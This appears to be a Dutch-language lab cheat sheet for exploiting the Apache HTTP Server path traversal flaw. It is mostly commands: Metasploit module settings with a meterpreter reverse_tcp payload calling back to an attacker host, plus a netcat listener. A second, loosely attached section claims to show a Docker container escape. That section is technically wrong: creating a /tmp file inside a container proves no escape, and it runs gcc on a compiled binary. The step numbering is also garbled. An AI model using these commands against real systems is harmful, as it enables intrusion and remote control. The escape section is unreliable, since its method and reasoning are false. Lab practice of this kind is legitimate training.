# Cheat sheet aanval van Apache HTTP server path traversal

Voor het uitvoeren van de aanval van Apache HTTP server path traversal zijn de volgende stappen nodig:

Stap 1: Contolleer of de VM's met elkaar kunnen communiceren

```bash
ping <ip-van-de-server>
PING 192.168.0.254 (192.168.0.254) 56(84) bytes of data.
64 bytes from 192.168.0.254: icmp_seq=1 ttl=64 time=3.43 ms
64 bytes from 192.168.0.254: icmp_seq=2 ttl=64 time=0.419 ms
64 bytes from 192.168.0.254: icmp_seq=3 ttl=64 time=0.423 ms
```

Metasploitable gebruiken:

```bash
msfconsole
```

```bash
use exploit/multi/http/apache_normalize_path_rce
show options
set RHOSTS 192.168.0.159
set RPORT 8080
set TARGETURI /
set SSL false
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.251
set LPORT 4444

```

Start de netcat listener op de kali machine:

```bash
nc -lvnp 4444
```

```bash
run
```

tap 1: Verbind met de Docker-container

Voordat je de exploit uitvoert, moet je een manier hebben om de kwetsbare container aan te vallen. Als je Kali en de Ubuntu-machine op hetzelfde netwerk hebt, kun je verbinding maken met de Docker-container via de docker exec of docker attach opdracht. Maar als je de container vanuit Kali wilt aanvallen, kun je ook de netwerkpoort van de container gebruiken, afhankelijk van hoe de container is ingesteld.
Stap 2: PoC-exploit Voorbereiden (Docker container escape)

We gaan een simple local exploit uitvoeren door een programma op de kwetsbare container te compilen en het aanroepen vanaf Kali.
Maak een simpele exploit in Kali:

    Maak een exploitbestand aan, bijvoorbeeld docker_poc_exploit.c:

#include <stdio.h>
#include <stdlib.h>
int main() {
    // De exploit voert een system-aanroep uit om een bestand aan te maken op de host
    system("touch /tmp/exploit_from_kali");
    return 0;
}

    Compileer de exploit op je Kali-systeem:

gcc docker_poc_exploit.c -o docker_poc_exploit

    Verbind met de kwetsbare Docker-container en voer de exploit uit:

        Hier gaan we ervan uit dat je container met verhoogde rechten draait op je Ubuntu-systeem (zoals geïnstalleerd in het script).

        Verbind via docker exec of docker attach:

    docker exec -it vulnerable-container bash

    Binnen de container, ga je de exploit uitvoeren door de exploit te kopiëren en te compileren binnen de container:

# Kopieer de exploit naar de container
docker cp docker_poc_exploit vulnerable-container:/tmp/docker_poc_exploit

# Log in in de container
docker exec -it vulnerable-container bash

# Compileer de exploit binnen de container
gcc /tmp/docker_poc_exploit -o /tmp/exploit

# Voer de exploit uit
/tmp/exploit

Stap 3: Controleer of de exploit succesvol is

Als de exploit succesvol is, zou je een bestand moeten zien verschijnen op je host systeem (bijv. /tmp/exploit_from_kali). Dit toont aan dat de container-escape gelukt is.

Controleer het bestand op de host:

ls /tmp/exploit_from_kali

Als je het bestand ziet, is de exploit succesvol uitgevoerd en is de container geëscaleerd naar de host.
Stap 4: Verwijder de kwetsbare container

Na het uitvoeren van de test kun je de kwetsbare container verwijderen om ervoor te zorgen dat deze geen schade aanricht aan je systeem:

docker rm -f vulnerable-container

Samenvatting van de procedure

    Maak de exploit op Kali en voer deze uit binnen de kwetsbare Docker-container.

    De exploit probeert een bestand te creëren op de host-systeem, wat aantoont dat de kwetsbare container succesvol is ontsnapt naar het host-systeem.

    Zorg ervoor dat je alle containers verwijdert nadat je de test hebt uitgevoerd om geen onbedoelde gevolgen te ondervinden.

Let op: Deze aanval wordt alleen uitgevoerd in een gecontroleerde testomgeving en moet niet worden gebruikt in productieomgevingen, aangezien dit kan leiden tot ernstige beveiligingsrisico’s.